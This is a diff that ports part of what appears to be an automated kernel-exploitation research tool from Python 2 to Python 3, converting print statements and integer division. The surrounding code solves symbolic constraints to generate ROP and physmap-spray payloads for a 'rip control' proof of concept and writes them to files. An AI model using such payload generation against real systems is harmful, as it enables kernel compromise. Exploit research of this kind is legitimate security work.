@@ -18,7 +18,7 @@ class PayloadGenerationMixin:
         number_of_saved_register = self.current_smash_gadget[0]
         ROP_FIRST_GADGET_LOCATION = 0x9191a000 - self.current_smash_payload_len + self.current_smash_gadget[1] + 8 + number_of_saved_register*8
         NUM_OF_TRANSPORT = 10
-        length_in_qword = len(payload) / 8
+        length_in_qword = len(payload) // 8
         c_payload = "// automatically generated osok payload \n// contact: ww9210@gmail.com\n"
         c_payload += '''/*
 add the following code to your rip control poc
@@ -159,7 +159,7 @@ void do_mmap(){
 
         # constrain rsi to the black hole
         if is_fast_path or self.reproduce_mode:
-            print '[+] using fast path to generate payload'
+            print('[+] using fast path to generate payload')
             # src = rop_payload_page + 0x1000-required_length + 1
             src = 0x9191a000 - self.current_smash_payload_len
             state.add_constraints(state.regs.rsi == src)
@@ -177,11 +177,11 @@ void do_mmap(){
                 state.add_constraints(state.regs.rdx > minimal_payload_len)
                 state.add_constraints(state.regs.rdx < 0x200)
             # for constrain_action in state.actions:
-                # print constrain_action
+                # print(constrain_action)
             if state.satisfiable():
-                print 'generating physmap spray content..., this may take a while for our old buddy solver'
+                print('generating physmap spray content..., this may take a while for our old buddy solver')
                 spray_content = ''
-                print 'getting all symbolic bytes...'
+                print('getting all symbolic bytes...')
                 # embed()  # investigating the disaster of constraint solving..
                 # this constraint solving eat too much memory, we do not want to do that unless necessary
                 for symbolic_byte in self.physmap_bytes:
@@ -191,7 +191,7 @@ void do_mmap(){
                     else:
                         spray_content += state.solver.eval(symbolic_byte, cast_to=str)
                 # this constraint solving eat too much memory, we do not want to do that unless necessary
-                print 'generating...'
+                print('generating...')
                 spray_payload = self.generate_physmap_spray_payload(spray_content)
                 # update payload number
                 if self.lock is not None:
@@ -202,8 +202,8 @@ void do_mmap(){
                 filepath = 'payloads/' + filename
                 with open(filepath, 'w') as f:
                     f.write(spray_payload)
-                print colorama.Fore.MAGENTA + '[+] successfully write payload to file:', filepath + \
-                    colorama.Style.RESET_ALL
+                print(colorama.Fore.MAGENTA + '[+] successfully write payload to file:', filepath + \
+                    colorama.Style.RESET_ALL)
                 infoname = 'info_' + '%07d' % self.num_of_generate_payload + '.txt'
                 infopath = 'payloads/' + infoname
                 with open(infopath, 'w') as f:
@@ -260,11 +260,11 @@ void do_mmap(){
 
                 return True
             else:
-                print 'unsatisfiable'
-                print 'something wrong with constraints.'
+                print('unsatisfiable')
+                print('something wrong with constraints.')
                 # it is common sometimes these constraints can not be satisfied, let it go.
                 # embed()
         else:
-            print 'something wrong with rdx'  # should never happen
+            print('something wrong with rdx') # should never happen
             embed()
         return False
